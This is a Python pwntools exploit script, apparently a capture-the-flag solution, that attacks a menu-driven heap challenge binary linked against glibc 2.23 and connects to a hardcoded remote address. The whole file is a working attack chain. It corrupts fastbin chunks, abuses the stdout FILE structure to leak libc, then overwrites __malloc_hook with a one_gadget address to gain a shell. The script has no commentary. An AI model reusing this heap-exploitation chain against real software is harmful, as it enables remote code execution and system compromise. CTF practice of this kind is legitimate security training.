# -*- coding: utf-8 -*
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.arch = 'amd64'
io = 0
libc=ELF('../libc-2.23.so')
def pwn(ip,port,debug,flaag):
	elf = ELF(flaag)
	global io
	if(debug == 1):
		io = process(flaag)

	else:
		io = remote(ip,port)
	def add(size,content):
		io.sendlineafter(">> ","1")
		io.sendlineafter("question",'80')
		io.sendlineafter("___?",str(size))
		io.sendafter("yes_or_no?",content)
	def free(index):
		io.sendlineafter(">> ","2")
		io.sendlineafter("index ?",str(index))
	def show(index):
		io.sendlineafter(">> ","3")
		io.sendlineafter("index ?",str(index))
	def edit(index,content):
		io.sendlineafter(">> ","4")
		io.sendlineafter("index ?",str(index))
		io.sendafter("content ?",content)

		
	add(0x60,"\xff"*0x100)#0
	edit(0,p64(0)+p64(0x71))
	add(0x60,'\xff'*0x100)#1
	edit(1,p64(0)+p64(0x51))
	add(0x60,"\xff"*0x100)#2
	edit(2,p64(0)*3+p64(0x51))
		
	free(0)
	free(1)
	edit(1,"\x10")
	add(0x60,"\xff"*0x100)#3
	add(0x60,"\xff"*0x100)#4
	edit(4,p64(0)*0xb+p64(0x71))
	free(1)
	
	edit(4,p64(0)*0xb+p64(0x91))
	free(1)

	
	edit(4,p64(0)*0xb+p64(0x71))
	edit(1,'\xdd\x85')
	
	add(0x60,'\xff'*0x100)

	add(0x60,'\xff'*0x100)
		
	edit(6,'a'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')
	IO_stderr = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-192
	libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
	onegadget = 0xf1207 + libc_base
	print(hex(libc_base))
	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	fake = malloc_hook - 0x23
	
	add(0x60,'\xff'*0x100)#7
	
	free(7)
	edit(7,p64(fake))
	add(0x60,'\xff'*0x100)
	add(0x60,'\xff'*0x100)
	edit(9,'b'*0x13+p64(onegadget))
	
	io.interactive()
if __name__ == '__main__':
	pwn('101.200.53.148',15423,0,'./pwn')
